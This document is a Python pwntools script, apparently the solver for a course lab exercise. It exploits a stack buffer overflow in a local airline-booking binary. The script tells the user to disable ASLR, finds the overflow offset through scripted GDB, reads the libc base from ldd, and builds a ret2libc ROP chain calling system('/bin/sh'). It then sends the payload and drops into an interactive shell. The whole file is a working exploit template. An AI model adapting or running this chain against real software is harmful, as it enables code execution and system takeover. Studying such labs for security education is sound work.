#!/usr/bin/env python3
import sys
import subprocess
import re
import time
from pwn import *

# === Configuration ===
exe = './bin/ex1'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

def check_aslr():
    """
    Checks if ASLR is disabled. Returns True if disabled (good), False otherwise.
    """
    try:
        with open('/proc/sys/kernel/randomize_va_space', 'r') as f:
            val = f.read().strip()
            if val != '0':
                log.warning(f"ASLR is ENABLED (value: {val}).")
                log.warning("Please run: sudo ../util/toggle-aslr.sh")
                log.warning("Or: sudo sysctl -w kernel.randomize_va_space=0")
                return False
    except Exception as e:
        log.warning(f"Could not check ASLR status: {e}")
    return True

def get_offset_gdb():
    """
    Calculates the exact buffer offset using GDB non-interactively.
    """
    log.info("Calculating buffer offset via GDB...")
    # Commands to run inside GDB
    gdb_cmds = [
        "file " + exe,
        "break check_booking",
        "run < /dev/null",
        "next", "next", # Step over prologue to setup RBP
        # Calculate difference between Saved RIP ($rbp+8) and buffer (&name)
        "printf \"OFFSET: %ld\\n\", (long)((void*)($rbp+8) - (void*)&name)",
        "quit"
    ]
    
    try:
        # Run GDB
        out = subprocess.check_output(
            ["gdb", "-q", "-batch"] + [arg for cmd in gdb_cmds for arg in ["-ex", cmd]],
            stderr=subprocess.STDOUT
        ).decode()
        
        # Extract the number
        match = re.search(r"OFFSET:\s*([0-9]+)", out)
        if match:
            off = int(match.group(1))
            log.success(f"Offset found: {off}")
            return off
    except Exception as e:
        log.error(f"GDB failed: {e}")
    
    # Fallback offset if GDB fails
    return 344

def get_libc_base():
    """
    Finds the Libc base address using ldd (requires ASLR disabled).
    """
    try:
        out = subprocess.check_output(['ldd', exe]).decode()
        for line in out.splitlines():
            if 'libc.so' in line:
                # Parse line: libc.so.6 => /lib/... (0x7ffff...)
                right = line.split('=>')[1].strip()
                path = right.split(' ')[0]
                addr_str = right.split('(')[1].split(')')[0]
                addr = int(addr_str, 16)
                return path, addr
    except Exception as e:
        log.error(f"ldd failed: {e}")
    return None, None

def main():
    print("=== Lab 3 Ex 1: Pure Python Solver ===")
    
    # 1. Check Environment
    if not check_aslr():
        return

    # 2. Get Exploit Parameters
    offset = get_offset_gdb()
    libc_path, libc_base = get_libc_base()
    
    if not libc_base:
        log.error("Could not find Libc base. Is ASLR definitely disabled?")
        return

    log.success(f"Libc Base: {hex(libc_base)}")
    log.success(f"Libc Path: {libc_path}")

    # 3. Setup Libc & ROP
    libc = ELF(libc_path, checksec=False)
    libc.address = libc_base
    rop = ROP(libc)

    # 4. Find Gadgets & Symbols
    # pop rdi; ret
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    
    # ret (Stack Alignment Gadget)
    ret_gadget = rop.find_gadget(['ret']).address

    # System & String
    system_addr = libc.sym['system']
    exit_addr   = libc.sym['exit']
    binsh_addr  = next(libc.search(b'/bin/sh\x00'))

    log.info(f"POP RDI : {hex(pop_rdi)}")
    log.info(f"RET     : {hex(ret_gadget)}")
    log.info(f"SYSTEM  : {hex(system_addr)}")
    log.info(f"/bin/sh : {hex(binsh_addr)}")

    # 5. Construct Payload
    # Structure: [Padding] + [RET (Align)] + [POP RDI] + [&binsh] + [SYSTEM] + [EXIT]
    payload = flat({
        offset: [
            ret_gadget,   # Ensures stack is 16-byte aligned for system()
            pop_rdi,      # Put &binsh into RDI
            binsh_addr,   # Address of "/bin/sh"
            system_addr,  # Call system()
            exit_addr     # Clean exit
        ]
    })

    # Sanity check for scanf delimiters
    bad_chars = b' \t\n\r\v\f'
    if any(b in bad_chars for b in payload):
        log.warning("Payload contains bad characters (whitespace). Exploit might fail.")

    # 6. Launch Exploit
    p = process(exe)
    
    # Handle "Select an airline"
    p.recvuntil(b'airline:\n')
    p.sendline(b'0')
    
    # Handle "Input your name"
    p.recvuntil(b'booking:\n')
    
    log.info(f"Sending payload ({len(payload)} bytes)...")
    p.sendline(payload)
    
    # 7. Interactive Mode
    # Note: system("/bin/sh") spawns a shell that shares stdin/stdout.
    # We perform a small clean to remove any leftover buffer text.
    try:
        p.clean(timeout=0.2)
    except:
        pass

    log.success("Enjoy your shell! (Type 'ls', 'id', etc.)")
    
    # Tip: Sometimes prompts don't show up immediately. 
    # Sending a dummy command helps verify visibility.
    p.sendline(b'echo "Shell is active!"')
    
    p.interactive()

if __name__ == "__main__":
    main()
